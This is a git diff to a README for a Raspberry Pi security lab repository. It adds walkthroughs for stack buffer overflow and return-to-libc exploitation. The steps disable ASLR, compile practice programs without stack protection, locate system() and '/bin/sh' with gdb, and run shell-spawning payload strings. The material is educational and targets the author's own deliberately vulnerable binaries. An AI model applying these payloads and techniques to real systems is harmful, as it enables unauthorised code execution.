@@ -1,8 +1,8 @@
 # HackRPi
 - [System Call Hooking](https://github.com/korkeep/HackRPi#system-call-hooking-)
 - [Buffer Overflow](https://github.com/korkeep/HackRPi#buffer-overflow-)
-- [Return-Oriented Programming](https://github.com/korkeep/HackRPi#return-oriented-programming-)
 - [Return-To-Libc](https://github.com/korkeep/HackRPi#return-to-libc-)
+- [Return-Oriented Programming](https://github.com/korkeep/HackRPi#return-oriented-programming-)
 
 ## System Call Hooking 🐱‍💻
 ### Insert kernel files to RPi
@@ -60,33 +60,38 @@ kss@ubuntu:~/HackRPi$ sudo umount /mnt/fs
 pi@raspberrypi:~/Hook$ sudo insmod hooker.ko
 ```
 - **Result**  
-![image](https://user-images.githubusercontent.com/20378368/107659443-7fe77180-6cca-11eb-8289-478622d81042.png)  
+![image](https://user-images.githubusercontent.com/20378368/107657527-97bdf600-6cc8-11eb-8165-81f5bb721fc0.png)  
 
 ## Buffer Overflow 🐱‍💻
-- **Step 1**: Compile without stack protection  
+- **Step 1**: Unlock ASLR  
+```
+pi@korkeep:~/BOF $ sudo sysctl -w kernel.randomize_va_space=0
+```
+- **Step 2**: Compile without stack protection  
 ```
 pi@korkeep:~/BOF $ gcc -fno-stack-protector -z execstack BOF.c -o BOF
 ```
-- **Step 2**: Debugging with gdb  
+- **Step 3**: Debugging with gdb  
 ```
 pi@korkeep:~/BOF $ gdb -q BOF
+(gdb) start
 ```
-- **Step 3**: Disassemble the main function  
+- **Step 4**: Disassemble main  
 ```
 (gdb) disassemble main
 ```
-- **Step 4**: Set a breakpoint to hack  
+- **Step 5**: Set a breakpoint to hack  
 ![image](https://user-images.githubusercontent.com/20378368/107657827-e1a6dc00-6cc8-11eb-9891-0387c6b8c34b.png)  
 ```
 // Breakpoint target:
 // 0x00010530 <+40>:    mov     r3, #0
 (gdb) b *0x00010530
 ```
-- **Step 5**: Analyze address state  
+- **Step 6**: Analyze address state  
 ```
 (gdb) x/100x $sp-200
 ```
-- **Step 6**: Buffer overflow using NOP sled  
+- **Step 7**: Buffer overflow using NOP sled  
 ![image](https://user-images.githubusercontent.com/20378368/107655183-a86d6c80-6cc6-11eb-9a09-7223b26fdd69.png)  
 ```
 // Target address: 0x7efff570
@@ -95,6 +100,72 @@ pi@korkeep:~/BOF $ gdb -q BOF
 - **Result**  
 ![image](https://user-images.githubusercontent.com/20378368/107658056-1dda3c80-6cc9-11eb-9173-69a569d9439f.png)  
 
-## Return-Oriented Programming 🐱‍💻
-
 ## Return-To-Libc 🐱‍💻
+### Original RTL attack scheme
+- **Step 1**: Unlock ASLR  
+```
+pi@korkeep:~/RTL $ sudo sysctl -w kernel.randomize_va_space=0
+```
+- **Step 2**: Compile without stack protection  
+![image](https://user-images.githubusercontent.com/20378368/107732766-87476300-6d3c-11eb-88cf-ee929dbae4ee.png)  
+```
+// To practice RTL attack, compile with all these options
+// However, Raspberry Pi3 does not support some options
+pi@korkeep:~/RTL $ gcc -m32 -mpreferred-stack-boundary=2 -fno-stack-protector -no-pie -fno-pic -o RTL RTL.c
+```
+- **Step 3**: Debugging with gdb  
+![image](https://user-images.githubusercontent.com/20378368/107732076-c70d4b00-6d3a-11eb-9929-fd4c3664b426.png)  
+```
+pi@korkeep:~/RTL $ gdb -q RTL
+(gdb) start
+```
+- **Step 4**: Print system() address  
+![image](https://user-images.githubusercontent.com/20378368/107729508-7bf03980-6d34-11eb-91f3-331a02ad046f.png)  
+```
+(gdb) print system
+```
+- **Step 5**: Find /bin/sh address  
+![image](https://user-images.githubusercontent.com/20378368/107729545-90343680-6d34-11eb-8a79-fc45acf8ab5c.png)  
+```
+(gdb) find &system, +99999999, "/bin/sh"
+```
+- **Step 6**: RTL attack using system(), /bin/sh address  
+```
+// Target address: 0x76e9ffac, 0x76f83c68
+(gdb) run $(python -c 'print("A"*16+"\xac\xff\xe9\x76"+"A"*4+"\x68\x3c\xf8\x76")')
+```
+### Alternative RTL attack scheme
+- **Step 1**: Unlock ASLR  
+```
+pi@korkeep:~/RTL $ sudo sysctl -w kernel.randomize_va_space=0
+```
+- **Step 2**: Compile without stack protection  
+```
+// Instead, HackRPi provides alternative source to practice RTL
+// system("/bin/sh") function is manually added at RTL.c
+pi@korkeep:~/RTL $ gcc -fno-stack-protector -z execstack -fno-pic -o RTL RTL.c
+```
+- **Step 3**: Debugging with gdb  
+```
+pi@korkeep:~/RTL $ gdb -q RTL
+(gdb) start
+```
+- **Step 4**: Disassemble rtl()  
+```
+(gdb) disassemble rtl
+```
+- **Step 5**: Find system(), /bin/sh address  
+![image](https://user-images.githubusercontent.com/20378368/107731737-0ab38500-6d3a-11eb-9b3e-07e1e3181b0b.png)
+```
+(gdb) x/x 0x10494
+(gdb) x/s 0x10558
+```
+- **Step 6**: RTL attack using ldr address  
+```
+//Target: 0x00010488
+(gdb) run $(python -c 'print("A"*16+"\x88\x04\x01")')
+```
+- **Result**  
+![image](https://user-images.githubusercontent.com/20378368/107734200-3174ba00-6d40-11eb-8306-32b063492b3f.png)
+
+## Return-Oriented Programming 🐱‍💻
